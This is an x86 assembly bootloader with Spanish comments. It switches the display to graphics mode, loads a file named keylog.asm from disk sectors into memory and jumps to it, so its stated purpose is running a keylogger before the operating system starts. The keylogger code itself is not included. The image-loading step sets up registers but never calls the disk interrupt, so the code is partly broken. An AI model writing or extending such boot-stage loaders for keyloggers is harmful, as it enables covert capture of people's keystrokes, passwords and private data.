; Este es el código del bootloader
org 0x7c00             ; El bootloader se carga en esta dirección de memoria
%define SECTOR_AMOUNT 0x4  ; Número de sectores a leer (tamaño de keylog.asm)

jmp short start        ; Salto al inicio del bootloader

start:
    ; Inicialización de registros
    cli                 ; Deshabilitar interrupciones
    xor ax, ax
    mov ds, ax
    mov ss, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov sp, 0x6ef0      ; Establecer el puntero de pila
    sti                 ; Habilitar interrupciones
    
    ; Cambiar a modo gráfico 13h (320x200 píxeles, 256 colores)
    mov ah, 0x00        ; Función BIOS para cambiar el modo
    mov al, 0x13        ; Modo gráfico 13h (320x200, 256 colores)
    int 0x10            ; Llamada BIOS para cambiar al modo gráfico

    ; Cargar la imagen desde el disco (BMP, por ejemplo)
    mov ah, 0x02        ; Función 0x02: leer sectores del disco
    mov al, SECTOR_AMOUNT ; Número de sectores a leer (ajusta según el tamaño de la imagen)
    mov bx, 0x1000      ; Dirección de memoria donde cargar la imagen BMP
    mov ch, 0           ; Cilindro
    mov dh, 0           ; Cabeza
    mov dl, 0           ; Unidad (disco 0)
    mov cl, 3           ; Sector de inicio (ajusta si es necesario)

    ; Cargar keylog.asm desde el disco
    mov ah, 0x02        ; Función 0x02: leer sectores del disco
    mov al, SECTOR_AMOUNT ; Número de sectores a leer
    mov bx, 0x8000      ; Dirección de memoria donde cargar keylog.asm
    mov ch, 0           ; Cilindro
    mov dh, 0           ; Cabeza
    mov dl, 0           ; Unidad
    mov cl, 2           ; Sector
    int 0x13            ; Llamada BIOS para leer sectores

    ; keylog.asm está cargado en 0x8000 y se salta
    jmp 0x8000          

times 510-($-$$) db 0  ; Rellenar el resto del sector hasta 512 bytes
db 0x55, 0xAA         ; Firma mágica para indicar que es un bootloader
